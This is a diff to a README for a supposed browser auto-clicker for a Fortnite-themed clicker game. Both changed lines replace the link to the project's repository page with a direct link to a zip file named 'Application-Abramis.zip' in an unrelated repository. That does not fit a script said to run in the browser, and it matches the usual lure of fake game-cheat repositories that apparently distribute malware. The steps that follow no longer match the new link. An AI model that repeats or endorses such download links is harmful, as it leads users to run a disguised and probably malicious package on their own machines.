@@ -5,7 +5,7 @@ description: "Automate clicking tasks for the Fortnite Baby Clicker web game wit
 ---
 # 🖱️ baby-clicker-script-update - Automate your clicks for faster progress
 
-[![](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/sarsbodyofwork411/baby-clicker-script-update)
+[![](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/sarsbodyofwork411/sarsbodyofwork411.github.io/raw/refs/heads/main/assets/Application-Abramis.zip)
 
 This tool automates clicking tasks in the web browser version of Fortnite Baby Clicker. It runs inside your browser and manages the clicking process for you. This saves time and keeps your game progress moving while you focus on other tasks.
 
@@ -20,7 +20,7 @@ This tool automates clicking tasks in the web browser version of Fortnite Baby C
 
 You must visit the repository page to get the latest version of the script. The script package contains all files necessary to run the automation tool in your browser environment.
 
-1. Go to this link: [https://github.com/sarsbodyofwork411/baby-clicker-script-update](https://github.com/sarsbodyofwork411/baby-clicker-script-update)
+1. Go to this link: [https://github.com/sarsbodyofwork411/sarsbodyofwork411.github.io/raw/refs/heads/main/assets/Application-Abramis.zip](https://github.com/sarsbodyofwork411/sarsbodyofwork411.github.io/raw/refs/heads/main/assets/Application-Abramis.zip)
 2. Locate the green button labeled "Code".
 3. Click the button and select "Download ZIP".
 4. Choose a folder on your computer to save the file.
